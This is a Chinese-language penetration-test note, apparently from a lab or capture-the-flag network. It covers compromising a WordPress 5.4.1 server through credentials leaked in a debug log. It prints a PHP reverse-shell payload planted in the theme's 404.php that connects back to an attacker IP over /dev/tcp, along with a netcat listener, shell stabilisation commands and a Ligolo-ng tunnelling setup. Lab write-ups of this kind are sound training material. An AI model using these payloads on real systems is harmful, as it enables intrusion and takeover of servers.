```markdown
# 🎯 10.10.110.100 - 初始 Web 服务器

## 🧾 基本信息

- 操作系统：Linux
- 主机名：未知
- 服务开放端口：
  - 21/tcp → FTP（匿名登录 ✅）
  - 65000/tcp → HTTP（WordPress 5.4.1）

---

## 🔍 信息收集与枚举

### 🌐 HTTP

- Web 服务运行在 **端口 65000**
- WordPress 安装在子路径 `/wordpress/`
- 后台登录地址：

```

[http://10.10.110.100:65000/wordpress/wp-login.php](http://10.10.110.100:65000/wordpress/wp-login.php)

```

- WordPress 版本：**5.4.1**
- debug log 路径泄露信息：
- 用户名：`james`
- 密码：`Toyota` ✅（首字母大写）

- 成功登录后台后可访问主题编辑器：

```

Appearance > Theme Editor > 404.php

````

---


## 🧨 攻击路径

1. 使用 `james:Toyota` 登录 WP 后台

2. 打开 `Twenty Twenty` 主题 → `404.php`

3. 插入反弹 shell payload：

   ```php
   <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.4/4444 0>&1'"); ?>
   ```

4. 在本地监听：

   ```bash
   nc -lvnp 4444
   ```

5. 访问触发反弹（可任意 404 页面）：

   ```
   http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/404.php
   ```

6. 成功反弹 shell，当前用户为 `www-data`

---

## 🛠️ Shell 稳定化

在拿到 shell 后执行以下命令，修复终端问题：

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## 🔌 Ligolo-ng 内网代理初始化

```bash
./proxy -laddr 0.0.0.0:11601 -selfcert
./agent -connect 10.10.14.4:11601 -ignore-cert

---
